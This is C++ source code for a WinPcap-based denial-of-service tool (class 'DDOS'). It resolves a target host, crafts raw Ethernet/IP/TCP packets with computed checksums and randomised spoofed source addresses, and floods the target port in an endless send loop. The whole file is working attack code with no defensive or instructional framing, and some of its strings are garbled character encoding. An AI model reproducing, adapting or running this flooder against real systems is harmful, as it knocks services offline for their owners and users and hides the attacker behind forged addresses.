#include "PCAP_DDOS.h"

DDOS::DDOS()
{
	srand(GetTickCount());

	WSADATA wsaData;
	if ((WSAStartup(0x0202, &wsaData)) != 0)
	{
		printf("ÍøÂç³õÊ¼»¯Ê§°Ü£¡");
	}
}
DDOS::DDOS(const char *WEB, int Port, int Threads)
{
	srand(GetTickCount());

	WSADATA wsaData;
	if ((WSAStartup(0x0202, &wsaData)) != 0)
	{
		printf("ÍøÂç³õÊ¼»¯Ê§°Ü£¡");
	}

	DDOS::InitDdos(DDOS::GetWEB_IP_s(WEB), Port, Threads);
}
DDOS::~DDOS()
{
	if (m_NetwokDevice)
	{
		pcap_freealldevs(m_NetwokDevice);
		if (m_WinpcapHandle)
		{
			pcap_close(m_WinpcapHandle);
		}
	}
	WSACleanup();
}

unsigned int DDOS::GetWEB_IP(const char *WEB)
{
	if (WEB == NULL) { return -1; }
	struct in_addr addr;
	struct hostent *host_ent;
	unsigned int m;
	unsigned int val;
	int i;
	if ((addr.s_addr = inet_addr(WEB)) == -1)
	{
		if (!(host_ent = gethostbyname(WEB)))
		{
			return (-1);
		}
		memcpy(&addr.s_addr, host_ent->h_addr, host_ent->h_length);
	}
	return (addr.s_addr);
}
char *DDOS::GetWEB_IP_s(const char *WEB, char *Buf)
{
	if (Buf == NULL) { return NULL; }
	unsigned int S_addr = DDOS::GetWEB_IP(WEB);
	char *buf = inet_ntoa(*((struct in_addr*)&S_addr));
	memcpy(Buf, buf, strlen(buf));
	return inet_ntoa(*((struct in_addr*)&S_addr));
}
char *DDOS::GetWEB_IP_s(const char *WEB)
{
	unsigned int S_addr = DDOS::GetWEB_IP(WEB);
	return inet_ntoa(*((struct in_addr*)&S_addr));
}
BOOL DDOS::InitDdos(const char *IP, int Port, int Threads)
{
	if (IP == NULL) { return FALSE; }
	memcpy_s(m_Target_IP, sizeof(m_Target_IP), IP, strlen(IP));
	memcpy_s(&m_Target_Port, sizeof(m_Target_Port), &Port, sizeof(Port));
	memcpy_s(&m_Threads, sizeof(m_Threads), &Threads, sizeof(Threads));


	//»ñÈ¡ÍøÂçÊÊÅäÆ÷
	if (pcap_findalldevs(&m_NetwokDevice, m_WinpcapError) == -1)
	{
		printf("pcap_findalldevs Error");
		return FALSE;
	}
	int i = 0;
	pcap_if_t *TempDevice = m_NetwokDevice;
	while (TempDevice)
	{
		printf("Number %d: ", i);
		printf("%s: ", TempDevice->name);
		printf("%s\n", TempDevice->description);


		memcpy_s(m_DeviceName[i], sizeof(m_DeviceName[i]), TempDevice->name, strlen(TempDevice->name));

		TempDevice = TempDevice->next;
		i++;
	}

	do
	{
		printf("Please Choose the Device Number:(0-%d)£º", i - 1);
		scanf("%d", &m_DeviceIndex);
		if (m_DeviceIndex > i - 1 || m_DeviceIndex < 0)
		{
			printf("Device Number Error\n");
		}
		else
		{
			break;
		}
	} while (true);

	m_WinpcapHandle = pcap_open_live((m_DeviceName[m_DeviceIndex]), 65535, 1, 1000, m_WinpcapError);
	if (m_WinpcapHandle == NULL)
	{
		printf("pcap_open_live error");
		pcap_freealldevs(m_NetwokDevice);
		return FALSE;
	}
	return TRUE;
}
unsigned short DDOS::checksum(unsigned short *data, int length)
{
	unsigned long temp = 0;
	while (length > 1)
	{
		temp += *data++;
		length -= sizeof(unsigned short);
	}
	if (length)
	{
		temp += *(unsigned short*)data;
	}
	temp = (temp >> 16) + (temp & 0XFFFF);
	temp += (temp >> 16);
	return (unsigned short)(~temp);
}
void DDOS::Run()
{
	memset(&m_ethernet, 0, sizeof(m_ethernet));
	BYTE destmac[8];
	destmac[0] = 0x00;
	destmac[1] = 0x11;
	destmac[2] = 0x22;
	destmac[3] = 0x33;
	destmac[4] = 0x44;
	destmac[5] = 0x55;
	memcpy(m_ethernet.DestMAC, destmac, 6);
	BYTE hostmac[8];
	hostmac[0] = 0x00;
	hostmac[1] = 0x1a;
	hostmac[2] = 0x4d;
	hostmac[3] = 0x70;
	hostmac[4] = 0xa3;
	hostmac[5] = 0x89;
	memcpy(m_ethernet.SourMAC, hostmac, 6);
	m_ethernet.EthType = htons(0x0800);


	memcpy(&m_SendBuffer, &m_ethernet, sizeof(struct EthernetHeader));
	m_IPHeader.Version_HLen = 0x45;
	m_IPHeader.TOS = 0;
	m_IPHeader.Length = htons(sizeof(struct IpHeader) + sizeof(struct TcpHeader) + strlen(m_TcpData));
	m_IPHeader.Ident = htons(1);
	m_IPHeader.Flags_Offset = 0;
	m_IPHeader.TTL = 128;
	m_IPHeader.Protocol = IPPROTO_TCP;
	m_IPHeader.Checksum = 0;
	m_IPHeader.DestinationAddr = inet_addr(m_Target_IP);

	m_TCPHeader.DstPort = htons(m_Target_Port);
	m_TCPHeader.SrcPort = htons(20000);
	m_TCPHeader.SequenceNum = htonl(11);
	m_TCPHeader.Acknowledgment = 0;
	m_TCPHeader.HdrLen = 0x50;
	m_TCPHeader.Flags = 0x18;
	//m_TCPHeader.Flags = 0x02;
	m_TCPHeader.AdvertisedWindow = htons(512);
	m_TCPHeader.UrgPtr = 0;
	m_TCPHeader.Checksum = 0;
	while (true)
	{
		if (m_Stop == STOP)
		{
			pcap_freealldevs(m_NetwokDevice);
			pcap_close(m_WinpcapHandle);
		}


		m_IPHeader.SourceAddr = rand() << 5 | rand() % 255;

		memcpy(&m_SendBuffer[sizeof(struct EthernetHeader)], 
			&m_IPHeader, sizeof(IpHeader));

		memcpy(&m_SendBuffer[sizeof(struct EthernetHeader) + sizeof(IpHeader)], 
			&m_TCPHeader, 20);

		m_PsdTCPHeader.SourceAddr = m_IPHeader.SourceAddr;
		m_PsdTCPHeader.DestinationAddr = m_IPHeader.DestinationAddr;
		m_PsdTCPHeader.Zero = 0;
		m_PsdTCPHeader.Protcol = IPPROTO_TCP;
		m_PsdTCPHeader.TcpLen = htons(sizeof(struct TcpHeader) + strlen(m_TcpData));

		char TempBuffer[65535];
		memcpy(TempBuffer,
			&m_PsdTCPHeader, sizeof(struct PsdTcpHeader));
		memcpy(TempBuffer + sizeof(struct PsdTcpHeader),
			&m_TCPHeader, sizeof(struct TcpHeader));
		memcpy(TempBuffer + sizeof(struct PsdTcpHeader) + sizeof(struct TcpHeader),
			m_TcpData, strlen(m_TcpData));
		m_TCPHeader.Checksum = DDOS::checksum((USHORT*)(TempBuffer),
			sizeof(struct PsdTcpHeader) + sizeof(struct TcpHeader) + strlen(m_TcpData));

		memcpy(m_SendBuffer + sizeof(struct EthernetHeader) + sizeof(struct IpHeader),
			&m_TCPHeader, sizeof(struct TcpHeader));
		memcpy(m_SendBuffer + sizeof(struct EthernetHeader) + sizeof(struct IpHeader) + sizeof(struct TcpHeader),
			m_TcpData, strlen(m_TcpData));

		memset(TempBuffer,
			0, sizeof(TempBuffer));
		memcpy(TempBuffer,
			&m_IPHeader, sizeof(struct IpHeader));
		m_IPHeader.Checksum = DDOS::checksum((USHORT*)(TempBuffer),
			sizeof(struct IpHeader));

		memcpy(m_SendBuffer + sizeof(struct EthernetHeader),
			&m_IPHeader, sizeof(struct IpHeader));

		if (pcap_sendpacket(m_WinpcapHandle,
			m_SendBuffer,
			sizeof(struct EthernetHeader) + sizeof(struct IpHeader) + sizeof(struct TcpHeader) + strlen(m_TcpData)) != 0)
		{
			printf("Send Error!\n");
		}
		Sleep(1);
	}
}

